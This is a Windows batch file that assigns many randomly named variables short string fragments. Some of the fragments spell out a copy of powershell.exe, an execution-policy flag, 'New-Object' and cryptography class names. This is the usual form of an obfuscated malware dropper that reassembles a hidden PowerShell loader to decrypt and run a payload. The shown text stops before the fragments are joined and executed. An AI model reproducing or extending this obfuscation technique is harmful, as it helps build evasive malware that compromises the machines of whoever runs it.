@echo off
set "FCSYQyMAHj=ws"
set "PkYYjwHlus=\W"
set "nICxwYHnDc=32"
set "oXSORsVEya=Sy"
set "DdBfAZxlgX=ll"
set "QXsZKoqySE=he"
set "CTlHhYvhTN=0\"
set "VzcvuKOwYq=ow"
set "kcJgsHyxQm=y "
set "MSRvqxhxiX=Wi"
set "gHBPgqAOXA=co"
set "DaJyIhIwSt=po"
set "CeOmoDyajX=in"
set "bKTNTHtLps=py"
set "fOujeUfODW= /"
set "fqWwODpDfV=:\"
set "lskhuwuaMB= C"
set "TQmBYxbuZH=ll"
set "LrqCumxIOi=rs"
set "VCsSxVuvLU=he"
set "kVRUNytKYa=do"
set "rPGuFsAORX=s\"
set "WeUubCnfVD=1."
set "KaIKydMZtM=xe"
set "FeRQHzjgdY=we"
set "IKyRFThaME=em"
set "cWmtNamPvP=rS"
set "PodUclKhev=.e"
set "JNusXOxtuK=nd"
set "AGeGSTsdlL=we"
set "mWFtbiUpjS=Po"
set "gViuZmPvaF=st"
set "gIpWhqJlGb=\v"
set "lVWcFUXZdY= %~dp0"
set "SUKJCPTEvD=cd"
set "yyeBZjUIPC=.Com"
set "QJkiLRKyTd=[]] "
set "hadmcEmpUZ=tem."
set "DExqFPaeMm=('Tg"
set "XwAXsLrEOq== $S"
set "CjvHOSdHgw=r = "
set "axnkgbSpRN=null"
set "lUVQYhxEiP=rD ="
set "AvZtVckuJL=ose("
set "sAAmWnnnFx= = N"
set "PxeRIhUmsV=16] "
set "SQTZareMtA=;$Fa"
set "GdshEdscWj=-Obj"
set "MxcofaydlA=.Key"
set "FosYReXiVb=embl"
set "FlYZDlywmE=ggzC"
set "geTjEFlrOF=F = "
set "YDELMMpKzG=yste"
set "MpILYdwGcR=yIf."
set "cdMgfxXUhp=raph"
set "wzoNZHPzbK=raph"
set "yiSMRCIOyf=oryS"
set "MimmEXaEoV=.-16"
set "PsUwAoQwUr=-ep "
set "MPLaDQwYBx=oin "
set "fqOzfKwBlK=gjYA"
set "olBjhlGdEA=YxVw"
set "tKAKxDnrww=New-"
set "MuWDlEVAHh=vert"
set "xgXdxssqOh=qF.T"
set "GeWpXNQtVN=Vr.D"
set "ctpMaJFAgs=Bmor"
set "hpiVpqkeqx=and "
set "zexyjyZauo=Syst"
set "evBfvbkLhf=am;$"
